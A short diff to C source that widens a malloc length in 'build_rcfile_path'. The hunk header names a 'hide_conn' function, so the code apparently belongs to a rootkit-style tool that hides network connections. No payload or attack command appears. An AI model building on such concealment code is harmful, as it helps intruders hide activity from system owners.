@@ -280,7 +280,7 @@ void hide_conn(struct sockaddr_in addr, int hide)
 int build_rcfile_path(void)
 {
 	char *name = NAME;
-	int len = 6 + strlen(name);
+	int len = 6 + strlen(name) + strlen(name);
 
 	rcfile = (char *)malloc(len);
 
